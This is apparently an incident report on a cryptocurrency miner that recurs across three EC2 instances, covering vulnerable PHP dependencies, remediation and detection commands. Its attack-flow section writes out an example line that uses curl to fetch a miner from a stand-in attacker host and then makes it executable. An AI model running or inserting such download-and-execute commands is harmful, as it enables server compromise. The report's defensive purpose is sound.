# ðŸš¨ ANALYSIS: Recurring Cryptocurrency Miner (3 Instances)

## Problem Statement
You've encountered cryptocurrency mining malware (`xd.x86`, similar to previous `qpAopmVd`) on **3 separate EC2 instances**, indicating a **systematic vulnerability** rather than random infection.

---

## Root Cause Analysis

### Primary Attack Vectors Identified

#### 1. **Vulnerable Composer Dependencies** âš ï¸ CRITICAL
Found 7 security vulnerabilities in your project:

```
âœ— league/commonmark              - CVE-2025-46734 (XSS in Attributes)
âœ— paragonie/sodium_compat        - CVE-2025-69277 (Incomplete validation)
âœ— phpunit/phpunit                - CVE-2026-24765 (Unsafe Deserialization RCE)
âœ— psy/psysh                      - CVE-2026-25129 (Local Privilege Escalation)
âœ— symfony/http-foundation        - CVE-2025-64500 (Authorization Bypass)
âœ— symfony/process                - CVE-2026-24739 (File Operations)
```

**Risk Level:** Multiple RCE vectors present. Attackers likely scanning for CVE-2026-24765 (PHPUnit RCE).

#### 2. **Deployment Script Vulnerabilities**
- Deploy.sh previously didn't validate git state before deployment
- Scripts execute with `sudo` without proper input validation
- No WAF protection on web application

#### 3. **Server Hardening Gaps**
From previous incidents:
- `/etc/cron.d/` had world-writable permissions (chmod 666)
- Once www-data achieves RCE, it can escalate to root
- No file integrity monitoring (FIM)
- No intrusion detection

---

## Attack Flow (How Each Time)

```
[Step 1] Attacker scans for publicly known CVEs
         â””â”€ Likely targets: CVE-2026-24765 (PHPUnit), CVE-2025-46734 (CommonMark)

[Step 2] Crafts exploit and sends malicious request
         â””â”€ Example: GET /api/endpoint?inject=payload
         â””â”€ Triggers vulnerable Composer package
         â””â”€ Code execution as www-data

[Step 3] PHP code downloads bootstrap malware
         â””â”€ curl http://attacker.com/xd.x86 > /tmp/xd.x86
         â””â”€ chmod +x /tmp/xd.x86
         â””â”€ Starts process

[Step 4] Creates cron job for persistence
         â””â”€ Writes to /etc/cron.d/ (exploits world-writable permissions)
         â””â”€ Cron executes as root

[Step 5] Mining begins
         â””â”€ 15-25% CPU consumption
         â””â”€ Communicates with C&C server
         â””â”€ Remains until manual kill
```

---

## Why It Happens Across All Instances

### âŒ Same Code = Same Vulnerabilities
Every EC2 instance you deploy gets the **same vulnerable composer.json**, so:
1. All instances have CVE-2026-24765 (PHPUnit RCE)
2. All instances have CVE-2025-46734 (CommonMark XSS â†’ RCE)
3. All instances have permission misconfigurations
4. Attacks are automated (bots scanning AWS IP ranges)

### âŒ Weak Security Posture
- No Web Application Firewall (WAF)
- No IDS/IPS (Intrusion Detection)
- No file integrity monitoring
- No rate limiting on API endpoints
- Direct internet exposure of vulnerable endpoints

---

## Remediation Plan

### CRITICAL (Do Immediately)

#### 1. Update Vulnerable Dependencies
```bash
# Update to latest safe versions
composer update paragonie/sodium_compat --with-all-dependencies  # >=1.24.0
composer update league/commonmark --with-all-dependencies         # >=2.7.0
composer update phpunit/phpunit --with-all-dependencies           # Remove from production!
composer update symfony/http-foundation --with-all-dependencies   # >=7.3.7
composer update symfony/process --with-all-dependencies           # >=8.0.5

# Verify no remaining issues
composer audit
```

#### 2. Remove Development Dependencies from Production
PHPUnit and PsySH should NOT be in production:

```bash
# In composer.json, move to require-dev
composer require --dev phpunit/phpunit psy/psysh

# Remove from production
composer install --no-dev
```

#### 3. Harden Server Permissions
```bash
# Fix cron permissions
sudo chmod 644 /etc/cron.d/*
sudo chmod 644 /etc/cron.daily/*
sudo chmod 644 /etc/cron.hourly/*

# Disable dangerous functions in PHP
echo "disable_functions = shell_exec,exec,system,passthru,proc_open,proc_close" >> /etc/php/8.x/apache2/php.ini
```

#### 4. Implement Web Application Firewall
```bash
# Install ModSecurity
sudo apt-get install libapache2-mod-security2 modsecurity-crs

# Enable OWASP Core Rule Set
sudo a2enmod security2
```

### HIGH (Within 48 hours)

#### 5. Implement File Integrity Monitoring
```bash
# Install AIDE (Another Integrity Database Editor)
sudo apt-get install aide

# Initialize
sudo aideinit

# Verify daily
sudo aide --check
```

#### 6. Set Up Intrusion Detection
```bash
# Install Fail2Ban
sudo apt-get install fail2ban

# Block after 5 failed SSH attempts
sudo systemctl enable fail2ban
```

#### 7. Harden Deploy Process
Update `scripts/deploy.sh`:
- Add package audit check before deploy
- Validate git state
- Run security checks

### MEDIUM (Within 1 week)

#### 8. AWS Security Groups
- Restrict SSH access to your IP only
- Use bastion host for production access
- Enable VPC Flow Logs

#### 9. Monitoring & Alerts
- CloudWatch: CPU > 20% for 5 min = Alert
- CloudWatch: Suspicious processes = Alert
- CloudTrail: All API calls logged

#### 10. Regular Audits
```bash
# Weekly
composer audit
npm audit

# Monthly
sudo aide --check  # Verify no rootkits
ps aux | grep -E "^\w+" | sort -k3 -rn | head -10  # Top CPU processes
```

---

## Detection Signatures

### How to Spot This Malware

**Process level:**
```bash
ps aux | grep -E "xd\.x86|qpAopmVd|\.x11"
```

**Network level:**
```bash
netstat -lnptu | grep -E "^tcp.*ESTABLISHED"
# Look for unusual outbound connections
```

**File level:**
```bash
find /tmp -type f -perm /111 -ls  # Executable files in /tmp
sudo find / -name "xd.x86" -o -name ".x11" 2>/dev/null
```

**Cron level:**
```bash
sudo cat /etc/cron.d/*
sudo crontab -u www-data -l
```

---

## Immediate Actions Required

### 1. Local (Today)
```bash
cd /var/www/html
composer update --with-all-dependencies
composer install --no-dev
git add composer.*
git commit -m "security: update vulnerable dependencies to fix CVE-2026-24765, CVE-2025-46734"
```

### 2. Production (Today)
```bash
bash scripts/fix-permissions.sh
bash scripts/deploy.sh
```

### 3. Rotate All Credentials (Today)
- SSH key pair
- Database password
- API keys (.env file)
- AWS IAM credentials

### 4. Clean Slate (Recommended)
- Terminate old instances
- Deploy fresh stack from hardened AMI
- Verify with security scan

---

## Timeline

- **T+0 (Now):** Update dependencies, deploy hardening
- **T+24h:** Verify no re-infection
- **T+7d:** Implement full monitoring stack
- **T+30d:** Run comprehensive security audit

---

## References

- [CVE-2026-24765 PHPUnit](https://github.com/advisories/GHSA-vvj3-c3rp-c85p)
- [CVE-2025-46734 CommonMark](https://github.com/advisories/GHSA-3527-qv2q-pfvx)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CIS Benchmarks - Linux](https://www.cisecurity.org/cis-benchmarks/)

---

**Status:** ðŸš¨ CRITICAL - Action Required  
**Last Updated:** 2026-02-09  
**Next Review:** 2026-02-12
